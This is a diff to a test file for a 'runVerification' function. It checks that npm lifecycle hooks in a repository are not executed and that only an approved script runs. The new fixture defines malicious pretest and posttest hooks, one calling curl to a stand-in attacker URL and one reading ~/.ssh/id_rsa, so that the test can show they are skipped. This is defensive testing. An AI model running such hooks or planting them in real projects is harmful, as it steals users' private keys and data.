@@ -42,7 +42,7 @@ describe('runVerification', () => {
     expect(spawnMock).not.toHaveBeenCalled();
   });
 
-  it('requires the selected npm script to exist', async () => {
+  it('requires the selected verification script to exist', async () => {
     await fs.writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: APPROVED_TEST_SCRIPT } }));
     await expect(runVerification(root, 'typecheck')).rejects.toThrow('VERIFICATION_SCRIPT_MISSING:typecheck');
     expect(spawnMock).not.toHaveBeenCalled();
@@ -56,7 +56,28 @@ describe('runVerification', () => {
     expect(spawnMock).not.toHaveBeenCalled();
   });
 
-  it('runs the exact approved script without a shell and returns bounded verification state', async () => {
+  it('does not execute repository-controlled npm lifecycle hooks', async () => {
+    await fs.writeFile(path.join(root, 'package.json'), JSON.stringify({
+      scripts: {
+        pretest: 'curl https://attacker.invalid/steal',
+        test: APPROVED_TEST_SCRIPT,
+        posttest: 'cat ~/.ssh/id_rsa',
+      },
+    }));
+    spawnMock.mockReturnValue(makeChild(0));
+
+    const result = await runVerification(root, 'test');
+
+    expect(result.ok).toBe(true);
+    expect(spawnMock).toHaveBeenCalledWith('/bin/sh', ['-c', APPROVED_TEST_SCRIPT], expect.objectContaining({
+      cwd: root,
+      shell: false,
+      env: expect.objectContaining({ HOME: expect.stringContaining('origin-verification-home-'), npm_config_ignore_scripts: 'true' }),
+    }));
+    expect(spawnMock.mock.calls[0][1]).not.toContain('npm run');
+  });
+
+  it('runs only the ORIGIN-owned command and returns bounded verification state', async () => {
     await fs.writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: APPROVED_TEST_SCRIPT } }));
     spawnMock.mockReturnValue(makeChild(0));
 
@@ -65,6 +86,6 @@ describe('runVerification', () => {
     expect(result.ok).toBe(true);
     expect(result.exitCode).toBe(0);
     expect(result.timedOut).toBe(false);
-    expect(spawnMock).toHaveBeenCalledWith('npm', ['run', 'test'], expect.objectContaining({ cwd: root, shell: false }));
+    expect(spawnMock).toHaveBeenCalledWith('/bin/sh', ['-c', APPROVED_TEST_SCRIPT], expect.objectContaining({ cwd: root, shell: false }));
   });
 });
